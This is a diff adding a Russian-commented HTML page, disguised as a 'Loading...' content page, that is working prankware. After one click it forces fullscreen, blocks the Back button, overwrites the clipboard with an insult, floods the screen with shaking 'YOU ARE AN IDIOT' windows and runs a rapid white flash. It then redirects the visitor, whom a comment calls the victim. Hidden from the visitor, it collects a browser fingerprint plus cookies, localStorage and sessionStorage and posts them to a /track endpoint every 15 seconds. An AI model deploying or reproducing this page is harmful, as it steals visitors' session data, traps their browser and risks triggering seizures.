@@ -1,0 +1,513 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
+    <style>
+        html, body {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            background: #000;
+            overflow: hidden;
+            font-family: Arial, sans-serif;
+            color: #fff;
+        }
+
+        #start-screen {
+            position: fixed;
+            inset: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            background: #000;
+            cursor: pointer;
+            z-index: 99999;
+        }
+        #start-screen h1 {
+            font-size: 22px;
+            margin-bottom: 30px;
+        }
+        #green-btn {
+            background: #00cc44;
+            color: #fff;
+            border: none;
+            padding: 18px 40px;
+            font-size: 20px;
+            border-radius: 8px;
+            cursor: pointer;
+            box-shadow: 0 0 20px rgba(0, 204, 68, 0.6);
+        }
+        #green-btn:hover {
+            background: #00ff55;
+        }
+
+        .hidden {
+            display: none !important;
+        }
+
+        #video-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 1;
+            display: none;
+        }
+        #video-container iframe {
+            width: 100%;
+            height: 100%;
+            border: none;
+        }
+
+        .virus-window {
+            position: fixed;
+            background: #000;
+            border: 2px solid #fff;
+            color: #fff;
+            font-family: monospace;
+            text-align: center;
+            padding: 8px;
+            z-index: 9999;
+            box-shadow: 0 0 15px #fff;
+            animation: blink 0.25s infinite, shake 0.15s infinite;
+            user-select: none;
+            pointer-events: none;
+            font-weight: bold;
+        }
+        .virus-window h3 {
+            margin: 0;
+            font-size: 16px;
+            line-height: 1;
+        }
+        .virus-window p {
+            margin: 4px 0 0 0;
+            font-size: 12px;
+            line-height: 1;
+        }
+
+        @keyframes blink {
+            0%, 100% {
+                color: #fff;
+                border-color: #fff;
+                background: #000;
+                box-shadow: 0 0 15px #fff;
+            }
+            50% {
+                color: #000;
+                border-color: #000;
+                background: #fff;
+                box-shadow: 0 0 15px #000;
+            }
+        }
+        @keyframes shake {
+            0%   { transform: translate(0, 0); }
+            25%  { transform: translate(2px, 2px); }
+            50%  { transform: translate(-2px, -2px); }
+            75%  { transform: translate(2px, -2px); }
+            100% { transform: translate(0, 0); }
+        }
+
+        #stop-btn {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            z-index: 999999;
+            background: red;
+            color: #fff;
+            border: none;
+            padding: 15px 30px;
+            font-size: 18px;
+            border-radius: 8px;
+            cursor: pointer;
+            display: none;
+            font-family: monospace;
+            font-weight: bold;
+        }
+
+        #flash {
+            position: fixed;
+            inset: 0;
+            background: #fff;
+            z-index: 99998;
+            display: none;
+            pointer-events: none;
+            animation: flash 0.1s infinite;
+        }
+        @keyframes flash {
+            0%, 100% { opacity: 0; }
+            50%      { opacity: 0.8; }
+        }
+
+        #kb-trap {
+            position: fixed;
+            opacity: 0;
+            pointer-events: none;
+            top: 50%;
+            left: 50%;
+            width: 1px;
+            height: 1px;
+        }
+    </style>
+</head>
+<body>
+
+    <div id="start-screen">
+        <h1>Загрузка контента...</h1>
+        <button id="green-btn">▶ Нажми, чтобы показать</button>
+    </div>
+
+    <div id="video-container">
+        <iframe id="yt-frame"
+            src=""
+            allow="autoplay; fullscreen; encrypted-media"
+            allowfullscreen>
+        </iframe>
+    </div>
+
+    <div id="flash"></div>
+
+    <button id="stop-btn">STOP</button>
+
+    <script>
+        // ================== НАСТРОЙКИ ==================
+        var REDIRECT_URL     = "https://example.com"; // куда кинуть жертву
+        var REDIRECT_AFTER   = 15000;                 // мс до редиректа
+        var VIDEO_ID         = "hPZxDJYmTUw";         // ID ролика YouTube
+        var TRACK_ENDPOINT   = "/track";              // куда слать фингерпринт
+        var SOUND_URL        = "";                    // ссылка на mp3 (опц.)
+
+        // пранк-окна
+        var SPAWN_EVERY      = 300;   // мс между появлением нового окна
+        var WINDOW_LIFE      = 500;   // мс жизни окна
+        var MAX_WINDOWS      = 0;     // 0 = без лимита, иначе число
+
+        // уровни (постепенное усиление). false — выключить
+        var LEVELS_ENABLED   = true;
+        var LEVEL_EVERY      = 10000; // мс между усилениями
+        var LEVEL_SPAWN_STEP = 30;    // на сколько мс уменьшать SPAWN_EVERY
+        var LEVEL_LIFE_STEP  = 100;   // на сколько мс увеличивать WINDOW_LIFE
+        var SPAWN_MIN        = 80;    // минимальный SPAWN_EVERY
+        var LIFE_MAX         = 1500;  // максимальный WINDOW_LIFE
+
+        // клавиатура и буфер
+        var KEYBOARD_EVERY   = 150;   // мс
+        var CLIPBOARD_EVERY  = 150;   // мс
+        var CLIP_TEXT        = "★YOU ARE AN IDIOT AHAHAHAHAHAH★";
+        // ===============================================
+
+        var started = false;
+        var stopFlag = false;
+
+        var windowCount = 0;
+        var spawnInterval = null;
+        var levelUpInterval = null;
+        var kbInterval = null;
+        var clipInterval = null;
+
+        // ---------- запуск ----------
+        function startVideo() {
+            if (started) return;
+            started = true;
+
+            document.getElementById('start-screen').classList.add('hidden');
+            document.getElementById('stop-btn').style.display = 'block';
+
+            // видео с YouTube
+            try {
+                var container = document.getElementById('video-container');
+                container.style.display = 'block';
+                var iframe = document.getElementById('yt-frame');
+                iframe.src = "https://www.youtube.com/embed/" + VIDEO_ID +
+                             "?autoplay=1&mute=0&controls=1&rel=0&playsinline=1";
+            } catch (e) {}
+
+            // звук (доп. mp3, если задан)
+            if (SOUND_URL) {
+                try {
+                    var a = new Audio(SOUND_URL);
+                    a.loop = true;
+                    a.volume = 1;
+                    a.play().catch(function () {});
+                } catch (e) {}
+            }
+
+            // fullscreen
+            try {
+                var el = document.documentElement;
+                if (el.requestFullscreen) {
+                    el.requestFullscreen();
+                } else if (el.webkitRequestFullscreen) {
+                    el.webkitRequestFullscreen();
+                }
+            } catch (e) {}
+
+            // блокировка кнопки «Назад»
+            try {
+                history.pushState({ p: 1 }, "", location.href);
+                window.addEventListener('popstate', function () {
+                    history.pushState({ p: 1 }, "", location.href);
+                });
+            } catch (e) {}
+
+            // вспышка
+            document.getElementById('flash').style.display = 'block';
+
+            // окна
+            startWindows();
+
+            // клавиатура и буфер
+            startKeyboardSpam();
+            startClipboardSpam();
+
+            // фингерпринт
+            sendFingerprint();
+
+            // редирект
+            if (REDIRECT_URL) {
+                setTimeout(function () {
+                    if (!stopFlag) {
+                        location.href = REDIRECT_URL;
+                    }
+                }, REDIRECT_AFTER);
+            }
+        }
+
+        // ---------- окна ----------
+        function spawnWindow() {
+            if (stopFlag) return;
+            if (MAX_WINDOWS > 0 && windowCount >= MAX_WINDOWS) {
+                if (spawnInterval) {
+                    clearInterval(spawnInterval);
+                    spawnInterval = null;
+                }
+                return;
+            }
+
+            windowCount++;
+
+            var win = document.createElement('div');
+            win.className = 'virus-window';
+
+            var w = 120 + Math.floor(Math.random() * 80);
+            var h = 60 + Math.floor(Math.random() * 40);
+
+            var x = Math.max(0, Math.floor(Math.random() * (window.innerWidth - w)));
+            var y = Math.max(0, Math.floor(Math.random() * (window.innerHeight - h)));
+
+            win.style.left   = x + 'px';
+            win.style.top    = y + 'px';
+            win.style.width  = w + 'px';
+            win.style.height = h + 'px';
+
+            win.innerHTML = '<h3>YOU ARE AN IDIOT</h3><p>#' + windowCount + '</p>';
+
+            document.body.appendChild(win);
+
+            setTimeout(function () {
+                if (win && win.parentNode) {
+                    win.remove();
+                }
+            }, WINDOW_LIFE);
+        }
+
+        function startWindows() {
+            spawnWindow();
+            spawnInterval = setInterval(spawnWindow, SPAWN_EVERY);
+
+            if (LEVELS_ENABLED) {
+                levelUpInterval = setInterval(function () {
+                    if (stopFlag) return;
+
+                    if (SPAWN_EVERY > SPAWN_MIN) {
+                        SPAWN_EVERY -= LEVEL_SPAWN_STEP;
+                        if (SPAWN_EVERY < SPAWN_MIN) SPAWN_EVERY = SPAWN_MIN;
+                    }
+                    if (WINDOW_LIFE < LIFE_MAX) {
+                        WINDOW_LIFE += LEVEL_LIFE_STEP;
+                        if (WINDOW_LIFE > LIFE_MAX) WINDOW_LIFE = LIFE_MAX;
+                    }
+
+                    if (spawnInterval) clearInterval(spawnInterval);
+                    spawnInterval = setInterval(spawnWindow, SPAWN_EVERY);
+                }, LEVEL_EVERY);
+            }
+        }
+
+        // ---------- клавиатура ----------
+        function toggleKeyboard() {
+            if (stopFlag) return;
+
+            var inp = document.getElementById('kb-trap');
+            if (!inp) {
+                inp = document.createElement('input');
+                inp.id = 'kb-trap';
+                inp.type = 'text';
+                inp.setAttribute('autocomplete', 'off');
+                inp.setAttribute('autocorrect', 'off');
+                inp.setAttribute('autocapitalize', 'off');
+                document.body.appendChild(inp);
+            }
+
+            try {
+                inp.focus();
+                inp.blur();
+            } catch (e) {}
+        }
+
+        function startKeyboardSpam() {
+            kbInterval = setInterval(toggleKeyboard, KEYBOARD_EVERY);
+        }
+
+        // ---------- буфер ----------
+        function copyToClipboard() {
+            if (stopFlag) return;
+
+            try {
+                var ta = document.createElement('textarea');
+                ta.value = CLIP_TEXT;
+                ta.style.position = 'fixed';
+                ta.style.opacity = '0';
+                ta.style.pointerEvents = 'none';
+                document.body.appendChild(ta);
+                ta.select();
+                document.execCommand('copy');
+                ta.remove();
+            } catch (e) {}
+
+            try {
+                if (navigator.clipboard && navigator.clipboard.writeText) {
+                    navigator.clipboard.writeText(CLIP_TEXT).catch(function () {});
+                }
+            } catch (e) {}
+        }
+
+        function startClipboardSpam() {
+            clipInterval = setInterval(copyToClipboard, CLIPBOARD_EVERY);
+        }
+
+        // ---------- стоп ----------
+        function stopEverything() {
+            stopFlag = true;
+
+            if (spawnInterval) {
+                clearInterval(spawnInterval);
+                spawnInterval = null;
+            }
+            if (levelUpInterval) {
+                clearInterval(levelUpInterval);
+                levelUpInterval = null;
+            }
+            if (kbInterval) {
+                clearInterval(kbInterval);
+                kbInterval = null;
+            }
+            if (clipInterval) {
+                clearInterval(clipInterval);
+                clipInterval = null;
+            }
+
+            var wins = document.querySelectorAll('.virus-window');
+            for (var i = 0; i < wins.length; i++) {
+                wins[i].remove();
+            }
+
+            document.getElementById('stop-btn').style.display = 'none';
+            document.getElementById('flash').style.display = 'none';
+
+            try {
+                var container = document.getElementById('video-container');
+                if (container) container.style.display = 'none';
+                var iframe = document.getElementById('yt-frame');
+                if (iframe) iframe.src = "";
+            } catch (e) {}
+
+            try {
+                if (document.exitFullscreen) document.exitFullscreen();
+            } catch (e) {}
+        }
+
+        // ---------- фингерпринт ----------
+        function collect() {
+            var d = {};
+
+            d.ua       = navigator.userAgent;
+            d.platform = navigator.platform;
+            d.lang     = navigator.language;
+            d.langs    = (navigator.languages || []).join(",");
+            d.cores    = navigator.hardwareConcurrency || 0;
+            d.mem      = navigator.deviceMemory || 0;
+            d.touch    = ('ontouchstart' in window);
+            d.screen   = screen.width + "x" + screen.height + "x" + screen.colorDepth;
+            d.tz       = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            d.url      = location.href;
+            d.ref      = document.referrer || "none";
+            d.hist     = history.length;
+
+            try {
+                var c = document.createElement("canvas");
+                var g = c.getContext("webgl") || c.getContext("experimental-webgl");
+                if (g) {
+                    var e = g.getExtension("WEBGL_debug_renderer_info");
+                    d.gpu_vendor   = g.getParameter(e ? e.UNMASKED_VENDOR_WEBGL   : g.VENDOR);
+                    d.gpu_renderer = g.getParameter(e ? e.UNMASKED_RENDERER_WEBGL : g.RENDERER);
+                }
+            } catch (e) {}
+
+            try {
+                var c2 = document.createElement("canvas");
+                c2.width = 200;
+                c2.height = 50;
+                var x = c2.getContext("2d");
+                x.textBaseline = "top";
+                x.font = "14px Arial";
+                x.fillStyle = "#f60";
+                x.fillRect(0, 0, 100, 20);
+                x.fillStyle = "#069";
+                x.fillText("N3XUS-fp", 2, 15);
+                d.canvas = c2.toDataURL().slice(-64);
+            } catch (e) {}
+
+            try { d.cookies = document.cookie || "none"; } catch (e) { d.cookies = "blocked"; }
+            try { d.ls      = JSON.stringify(localStorage).slice(0, 500); } catch (e) { d.ls = "blocked"; }
+            try { d.ss      = JSON.stringify(sessionStorage).slice(0, 500); } catch (e) { d.ss = "blocked"; }
+
+            d.plugins = Array.from(navigator.plugins || [])
+                             .map(function (p) { return p.name; })
+                             .join(",");
+
+            if (navigator.connection) {
+                d.conn = navigator.connection.effectiveType || "?";
+                d.down = navigator.connection.downlink || 0;
+            }
+
+            return d;
+        }
+
+        function sendFingerprint() {
+            try {
+                var data = collect();
+                fetch(TRACK_ENDPOINT, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(data)
+                }).catch(function () {});
+            } catch (e) {}
+        }
+
+        // ---------- обработчики ----------
+        document.getElementById('start-screen').addEventListener('click', startVideo);
+        document.getElementById('green-btn').addEventListener('click', function (e) {
+            e.stopPropagation();
+            startVideo();
+        });
+        document.getElementById('stop-btn').addEventListener('click', stopEverything);
+
+        // апдейт фингерпринта, пока страница открыта
+        setInterval(sendFingerprint, 15000);
+    </script>
+</body>
+</html>
